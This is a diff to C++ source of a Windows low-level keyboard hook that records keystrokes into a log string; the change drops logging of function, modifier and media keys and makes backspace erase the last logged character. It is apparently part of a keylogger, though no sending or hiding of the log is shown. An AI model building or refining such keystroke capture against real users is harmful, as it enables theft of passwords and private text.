@@ -44,10 +44,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
         switch (hooked_key.vkCode)
         {
-            case 0x14:   log += CapsLock ? "[CAPSLOCK OFF]" : "[CAPSLOCK ON]";       break;
-            case 0x90:   log += NumLock ? "[NUMLOCK OFF]" : "[NUMLOCK ON]";          break;
-            case 0x91:   log += Scroll ? "[SCROLL LOCK OFF]" : "[SCROLL LOCK ON]";   break;
-
             case 0x41:   log += CapsLock == Shift ? "a" : "A";                           break;
             case 0x42:   log += CapsLock == Shift ? "b" : "B";                           break;
             case 0x43:   log += CapsLock == Shift ? "c" : "C";                           break;
@@ -116,52 +112,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             case 0xDC:   log += Shift ? "|" : "\\";                              break;
             case 0xE2:   log += Shift ? ">" : "<";                               break;
 
-            case 0xA0:   case 0xA1:   log += "[SHIFT]";   break;
-            case 0xA2:   case 0xA3:   log += "[CTRL]";    break;
-            case 0xA4:   case 0xA5:   log += "[ALT]";     break;
-            case 0x5B:   case 0x5C:   log += "[WIN]";     break;
-
-            case 0x70:   log += "[F1]";    break;
-            case 0x71:   log += "[F2]";    break;
-            case 0x72:   log += "[F3]";    break;
-            case 0x73:   log += "[F4]";    break;
-            case 0x74:   log += "[F5]";    break;
-            case 0x75:   log += "[F6]";    break;
-            case 0x76:   log += "[F7]";    break;
-            case 0x77:   log += "[F8]";    break;
-            case 0x78:   log += "[F9]";    break;
-            case 0x79:   log += "[F10]";   break;
-            case 0x7A:   log += "[F11]";   break;
-            case 0x7B:   log += "[F12]";   break;
-
-            case 0x20:   log += " ";                    break;
-            case 0x08:   log += "[BACKSPACE]";          break;
-            case 0x09:   log += "[TAB]";                break;
-            case 0x0D:   log += "[ENTER]";              break;
-            case 0x13:   log += "[PAUSE]";              break;
-            case 0x1B:   log += "[ESC]";                break;
-            case 0x21:   log += "[PAGE UP]";            break;
-            case 0x22:   log += "[PAGE DOWN]";          break;
-            case 0x23:   log += "[END]";                break;
-            case 0x24:   log += "[HOME]";               break;
-            case 0x25:   log += "[LEFT ARROW]";         break;
-            case 0x26:   log += "[UP ARROW]";           break;
-            case 0x27:   log += "[RIGHT ARROW]";        break;
-            case 0x28:   log += "[DOWN ARROW]";         break;
-            case 0x29:   log += "[SELECT]";             break;
-            case 0x2A:   log += "[PRINT]";              break;
-            case 0x2C:   log += "[PRINT SCREEN]";       break;
-            case 0x2D:   log += "[INS]";                break;
-            case 0x2E:   log += "[DEL]";                break;
-            case 0xAD:   log += "[VOLUME MUTE]";        break;
-            case 0xAE:   log += "[VOLUME DOWN]";        break;
-            case 0xAF:   log += "[VOLUME UP]";          break;
-            case 0xB0:   log += "[NEXT TRACK]";         break;
-            case 0xB1:   log += "[PREVOUS TRACK]";      break;
-            case 0xB2:   log += "[STOP MEDIA]";         break;
-            case 0xB3:   log += "[PLAY/PAUSE MEDIA]";   break;
-
-            default:   log += "[UNKNOWN KEY]";   break;
+            case 0x08:   if (!log.empty()) log.pop_back();   break;
+            case 0x09:   log += "[TAB]";                     break;
+            case 0x0D:   log += "[ENTER]";                   break;
+            case 0x20:   log += " ";                         break;
         }
     }
 
